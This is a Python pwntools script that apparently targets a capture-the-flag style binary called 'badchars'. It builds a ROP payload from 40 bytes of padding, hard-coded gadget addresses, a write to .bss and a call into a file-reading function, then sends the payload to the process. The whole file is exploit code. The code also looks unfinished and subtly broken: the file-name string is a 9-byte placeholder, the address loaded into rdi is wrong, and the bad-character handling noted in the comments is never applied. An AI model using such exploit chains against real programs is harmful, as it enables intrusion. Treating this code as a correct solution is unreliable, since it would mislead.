import sys
from pwn import *

# bad chars ['0x78', '0x67', '0x61', '0x2e']
# x g a .

# ['0x66', '0x69', '0x6c', '0x65', '0x2e', '0x74', '0x78', '0x74']
# f i l e . t x t
# ['0x66', '0x6c', '0xeb', '0xeb', '0xeb', '0x74', '0xeb', '0x74']

fpath = './badchars'

if 'debug' in sys.argv:
    p = gdb.debug(fpath)
else:
    p = process(fpath)

padding  = b'A'*40
pop      = p64(0x40069c) # pop r12; pop r13; pop r14; pop r15; ret;
mov      = p64(0x400634) # mov qword ptr [r13], r12; ret;
bss      = p64(0x601038) # .bss
rdi      = p64(0x4006a3) # pop rdi; ret;
readf    = p64(0x400620) # inside sym.usefulFunction ()
fname    = b'CCCCCCCCC'

payload  = padding
payload += pop
payload += fname       # r12 => file.txt
payload += bss         # r13 => .bss
payload += b'B'*8      # r14 => B * 8 (padding)
payload += b'B'*8      # r15 => B * 8 (padding)
payload += mov         # bss should now have our str written
payload += rdi
payload += fname
payload += readf

with open('payload.bin', 'wb') as f:
    f.write(payload)
    log.success('Payload written to payload.bin')

p.recvuntil(b'> ')
p.send(payload)
resp = p.recvall()
